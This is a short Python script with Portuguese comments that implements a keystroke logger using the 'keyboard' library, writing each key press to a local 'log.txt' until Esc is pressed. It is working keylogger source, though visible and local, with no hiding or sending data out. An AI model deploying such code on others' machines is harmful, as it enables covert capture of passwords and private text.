import keyboard # Importando a biblioteca keyboard, usada para capturar eventos do teclado
import os       # Importando a biblioteca os, usada especificamente neste caso para manipulação do arquivo onde estarão salvas as teclas digitadas

def registrar_tecla(tecla): # Função responsável por registrar a telca capturada no arquivo 'log.txt'
    with open('log.txt', 'a', encoding='utf-8') as arquivo_log: # Abre (ou cria, caso não exista) o arquivo 'log.txt' no modo adição
        
        if tecla.name == 'enter': # Se a tecla for 'enter', faz uma quebra de linha
            arquivo_log.write(os.linesep) # Utilização do os.linesep para que garantir compatibilidade entre SOs na quebra de linha

        elif tecla.name == 'backspace': # Se a tecla for 'backspace', remove o último caractere gravado
            arquivo_log.seek(0, os.SEEK_END) # Move o ponteiro para o final do arquivo
            posicao_ponteiro = arquivo_log.tell() # Ontém a posição atual do ponteiro
            
            if posicao_ponteiro > 0:
                arquivo_log.truncate(posicao_ponteiro - 1) # Remove o último caractere digitado

        elif tecla.name == 'space': # Se a tecla for 'space', adiciona um espaço em branco
            arquivo_log.write(" ")

        elif len(tecla.name) == 1: # Se o nome da tecla tiver apenas 1 caracter, grava a tecla normalmente (o caso de letras, números, símbolos, sinais de pontuação, acentos, etc.)
            arquivo_log.write(tecla.name)

print('Iniciando a captura de teclas...')
print('  -> Caso queira sair, basta apertar "Esc"')

while True: # Loop infinito para manter a captura de teclas ativa até o momento que o usuário deseje encerrar
    tecla = keyboard.read_event(suppress=False) # Criando um objeto 'tecla' que vai ser utilizado para conter os names das teclas (atributo referente ao nome de uma tecla)

    if tecla.event_type == keyboard.KEY_DOWN: # Captura as teclas apenas quando digitadas
        if tecla.name == 'esc': # Quebra do loop infinito ao pressionar a tecla 'esc'
            print('Finalizamos a captura de teclas digitadas. Agora bastar conferir o resultado no arquivo "log.txt"!')
            break
        registrar_tecla(tecla) # Execução da função de registrar as teclas, utilizando os atributos salvos no objeto 'tecla' para decidir como cada tecla deve ser salva no arquivo 'log.txt'